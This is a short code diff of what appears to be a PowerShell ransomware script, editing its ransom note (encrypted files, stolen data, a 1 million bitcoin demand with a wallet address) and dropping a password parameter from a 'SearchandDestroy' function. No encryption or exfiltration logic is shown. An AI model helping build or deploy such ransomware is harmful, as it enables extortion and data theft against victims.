@@ -240,9 +240,9 @@ function Exfiltrate
         YOU HAVE BEEN PWND!!!!
     ===========================
 
-    Your files have been encrypted. We have also stolen the unencrypted files and will sell them to the highest bidder. 
+    Your files have been encrypted. Before we unencrypted the files, we extracted them. We will sell them to the highest bidder. 
 
-    To DECRYPT your files send us 1 million bitcoin to the following address: 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
+    To DECRYPT your files and get your files back send us 1 million bitcoin to the following address: 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH
        
 
     Generated on: $(Get-Date)             
@@ -262,12 +262,8 @@ function SearchandDestroy
 {
     param(
         [Parameter(Mandatory=$true)]
-        [string]$FolderPath,
-
-        
-        [Parameter(Mandatory=$true)]
-        [string]$Password
-        )
+        [string]$FolderPath
+    )
 
     $FolderPath = Validate-Path -Path $FolderPath -Type Folder
 
